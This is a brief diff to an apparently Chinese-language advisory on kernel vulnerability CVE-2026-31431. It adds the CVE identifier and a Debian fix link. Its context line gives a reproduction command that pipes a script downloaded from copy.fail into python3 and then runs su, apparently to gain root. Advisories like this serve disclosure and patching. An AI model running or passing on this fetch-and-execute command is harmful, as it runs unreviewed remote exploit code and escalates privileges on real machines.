@@ -4,6 +4,8 @@
 
 复现：`curl https://copy.fail/exp | python3 && su`
 
+CVE：CVE-2026-31431
+
 发行版修复方式：
 
 - Debian：通过内核更新修复，https://security-tracker.debian.org/tracker/CVE-2026-31431
